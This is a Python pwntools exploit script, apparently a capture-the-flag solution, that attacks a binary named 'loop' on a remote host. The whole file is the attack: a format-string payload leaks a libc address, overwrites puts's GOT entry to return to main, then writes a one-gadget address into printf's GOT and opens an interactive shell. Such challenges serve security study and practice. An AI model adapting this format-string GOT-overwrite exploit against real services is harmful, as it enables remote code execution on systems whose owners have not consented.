from pwn import *

debug = 0

if(debug):
	r = process("./loop")
	#gdb.attach(r)
	lsmain = 0x26fc0 + 243
	onegg = 0xe6c81
	printf_off = 0x64e10
else:
	r = remote("103.229.41.18", 5556)
	lsmain = 0x20740 + 240
	onegg = 0x45216
	printf_off = 0x55800

setvbuf_got = 0x601040
fgets_got = 0x601038
printf_got = 0x601028
puts_got = 0x601018
puts_got_value = 0x4005c6
main = 0x400805


payload = b"%23$lxP"  # 6 byte
payload += f'%{2053 - 13}x'.encode("utf-8") # 6 bytes
payload += b'%15$hn'
payload += b"a"*(24 - len(payload))
payload += p64(puts_got)
payload += b'\x00'*(0x40 - len(payload) -1)

r.sendline(payload)

#print(r.recvuntil(b"aaaa"))


stuff = r.recvuntil(b"aaa").split(b'P')[0][-12:]
stuff = int(stuff, 16)

libc_base = stuff - lsmain 

print(hex(libc_base))

onegg = libc_base + onegg
#print("printf: " + hex(libc_base + printf_off))
print("onegg : " + hex(onegg))

onelast = onegg & 0xff
twolast = int((onegg & 0xffff00)/0x100)

print(hex(twolast))

payload = f'%{onelast}x'.encode("utf-8") + b'%16$hhn'
payload += f'%{twolast - onelast}x'.encode("utf-8") + b'%17$hn'
payload += b"b"*(32-len(payload))
payload += p64(printf_got)
payload += p64(printf_got + 1)
payload += b'\x00'*(0x40 - len(payload) - 1)

r.recvuntil(b'your name?')
r.sendline(payload)

r.interactive()


